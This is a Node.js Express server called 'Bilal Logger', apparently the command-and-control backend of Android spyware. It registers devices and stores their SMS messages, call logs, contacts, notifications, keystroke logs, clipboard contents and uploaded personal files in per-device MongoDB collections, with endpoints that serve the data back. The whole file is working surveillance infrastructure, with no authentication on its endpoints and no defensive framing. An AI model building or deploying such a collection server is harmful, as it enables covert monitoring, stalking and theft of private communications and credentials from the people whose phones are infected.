const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// MongoDB connection
mongoose.connect('mongodb://localhost:27017/bilal_logger', {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));
db.once('open', () => {
    console.log('Connected to MongoDB');
});

// Device Schema
const deviceSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, unique: true },
    uuid: { type: String, required: true, unique: true },
    registrationDate: { type: Date, default: Date.now },
    lastSeen: { type: Date, default: Date.now },
    deviceInfo: {
        model: String,
        manufacturer: String,
        androidVersion: String,
        appVersion: String
    }
});

const Device = mongoose.model('Device', deviceSchema);

// Dynamic collection schemas for per-device data
const createDeviceCollection = (deviceId, collectionName) => {
    const schema = new mongoose.Schema({
        deviceId: { type: String, required: true },
        timestamp: { type: Date, required: true },
        uploaded: { type: Boolean, default: false },
        uploadDate: { type: Date },
        ...getSchemaForCollection(collectionName)
    }, { collection: `${deviceId}_${collectionName}` });
    
    return mongoose.model(`${deviceId}_${collectionName}`, schema);
};

const getSchemaForCollection = (collectionName) => {
    switch (collectionName) {
        case 'notifications':
            return {
                packageName: String,
                title: String,
                text: String,
                appName: String,
                timestamp: Date
            };
        case 'sms':
            return {
                address: String,
                type: String,
                body: String,
                timestamp: Date
            };
        case 'callLogs':
            return {
                number: String,
                type: String,
                duration: Number,
                timestamp: Date
            };
        case 'contacts':
            return {
                name: String,
                phoneNumber: String,
                email: String
            };
        case 'keylogs':
            return {
                key: String,
                appPackage: String,
                timestamp: Date
            };
        case 'clipboard':
            return {
                content: String,
                timestamp: Date
            };
        case 'fileEvents':
            return {
                filename: String,
                eventType: String,
                directoryPath: String,
                timestamp: Date
            };
        default:
            return {};
    }
};

// File storage setup
const createDeviceStorage = (deviceId) => {
    const basePath = path.join(__dirname, 'uploads', deviceId);
    const directories = ['images', 'documents', 'videos', 'audio', 'archives'];
    
    directories.forEach(dir => {
        const dirPath = path.join(basePath, dir);
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }
    });
    
    return basePath;
};

// Device registration endpoint
app.post('/api/register', async (req, res) => {
    try {
        const { deviceId, deviceInfo } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ error: 'Device ID is required' });
        }
        
        // Check if device already exists
        let device = await Device.findOne({ deviceId });
        
        if (!device) {
            // Create new device with UUID
            const uuid = uuidv4();
            device = new Device({
                deviceId,
                uuid,
                deviceInfo
            });
            await device.save();
            
            // Create storage directories
            createDeviceStorage(deviceId);
            
            console.log(`New device registered: ${deviceId} with UUID: ${uuid}`);
        } else {
            // Update last seen and device info
            device.lastSeen = new Date();
            device.deviceInfo = deviceInfo;
            await device.save();
        }
        
        res.json({
            success: true,
            uuid: device.uuid,
            deviceId: device.deviceId
        });
        
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// Data upload endpoints with pagination
const createUploadEndpoint = (collectionName) => {
    app.post(`/api/${collectionName}`, async (req, res) => {
        try {
            const { deviceId, data } = req.body;
            
            if (!deviceId || !data) {
                return res.status(400).json({ error: 'Device ID and data are required' });
            }
            
            // Verify device exists
            const device = await Device.findOne({ deviceId });
            if (!device) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            // Create or get device-specific collection
            const DeviceCollection = createDeviceCollection(deviceId, collectionName);
            
            // Prepare data with timestamps
            const documents = data.map(item => ({
                deviceId,
                timestamp: new Date(item.timestamp || Date.now()),
                uploaded: true,
                uploadDate: new Date(),
                ...item
            }));
            
            // Insert data
            const result = await DeviceCollection.insertMany(documents);
            
            console.log(`Uploaded ${result.length} ${collectionName} for device ${deviceId}`);
            
            res.json({
                success: true,
                count: result.length,
                message: `${result.length} ${collectionName} uploaded successfully`
            });
            
        } catch (error) {
            console.error(`Error uploading ${collectionName}:`, error);
            res.status(500).json({ error: `Failed to upload ${collectionName}` });
        }
    });
    
    // Get data endpoint with pagination
    app.get(`/api/${collectionName}/:deviceId`, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { page = 1, limit = 50, uploaded } = req.query;
            
            // Verify device exists
            const device = await Device.findOne({ deviceId });
            if (!device) {
                return res.status(404).json({ error: 'Device not found' });
            }
            
            // Create or get device-specific collection
            const DeviceCollection = createDeviceCollection(deviceId, collectionName);
            
            // Build query
            const query = { deviceId };
            if (uploaded !== undefined) {
                query.uploaded = uploaded === 'true';
            }
            
            // Calculate pagination
            const skip = (page - 1) * limit;
            
            // Get data with pagination
            const data = await DeviceCollection.find(query)
                .sort({ timestamp: -1 })
                .skip(skip)
                .limit(parseInt(limit));
            
            // Get total count
            const total = await DeviceCollection.countDocuments(query);
            
            res.json({
                success: true,
                data,
                pagination: {
                    page: parseInt(page),
                    limit: parseInt(limit),
                    total,
                    pages: Math.ceil(total / limit)
                }
            });
            
        } catch (error) {
            console.error(`Error fetching ${collectionName}:`, error);
            res.status(500).json({ error: `Failed to fetch ${collectionName}` });
        }
    });
};

// Create endpoints for all data types
['notifications', 'sms', 'callLogs', 'contacts', 'keylogs', 'clipboard', 'fileEvents'].forEach(createUploadEndpoint);

// File upload endpoint
app.post('/api/files/:deviceId', multer({ dest: 'temp/' }).single('file'), async (req, res) => {
    try {
        const { deviceId } = req.params;
        const { fileType, originalName } = req.body;
        const file = req.file;
        
        if (!deviceId || !file || !fileType) {
            return res.status(400).json({ error: 'Device ID, file, and file type are required' });
        }
        
        // Verify device exists
        const device = await Device.findOne({ deviceId });
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        // Create timestamped filename
        const timestamp = Date.now();
        const extension = path.extname(originalName || file.originalname);
        const filename = `${timestamp}_${originalName || file.originalname}`;
        
        // Determine storage directory based on file type
        const typeDirectories = {
            'image': 'images',
            'document': 'documents',
            'video': 'videos',
            'audio': 'audio',
            'archive': 'archives'
        };
        
        const storageDir = typeDirectories[fileType] || 'documents';
        const deviceStoragePath = path.join(__dirname, 'uploads', deviceId, storageDir);
        
        // Ensure directory exists
        if (!fs.existsSync(deviceStoragePath)) {
            fs.mkdirSync(deviceStoragePath, { recursive: true });
        }
        
        // Move file to final location
        const finalPath = path.join(deviceStoragePath, filename);
        fs.renameSync(file.path, finalPath);
        
        // Log file event
        const DeviceCollection = createDeviceCollection(deviceId, 'fileEvents');
        await DeviceCollection.create({
            deviceId,
            filename,
            eventType: 'UPLOADED',
            directoryPath: path.join(deviceId, storageDir),
            timestamp: new Date(timestamp),
            uploaded: true,
            uploadDate: new Date()
        });
        
        console.log(`File uploaded: ${filename} for device ${deviceId}`);
        
        res.json({
            success: true,
            filename,
            path: path.join(deviceId, storageDir, filename),
            size: file.size
        });
        
    } catch (error) {
        console.error('File upload error:', error);
        res.status(500).json({ error: 'File upload failed' });
    }
});

// Get devices endpoint
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find().sort({ lastSeen: -1 });
        res.json({
            success: true,
            devices: devices.map(device => ({
                deviceId: device.deviceId,
                uuid: device.uuid,
                registrationDate: device.registrationDate,
                lastSeen: device.lastSeen,
                deviceInfo: device.deviceInfo
            }))
        });
    } catch (error) {
        console.error('Error fetching devices:', error);
        res.status(500).json({ error: 'Failed to fetch devices' });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date(),
        uptime: process.uptime()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Bilal Logger Server running on port ${PORT}`);
    console.log(`Health check: http://localhost:${PORT}/api/health`);
}); 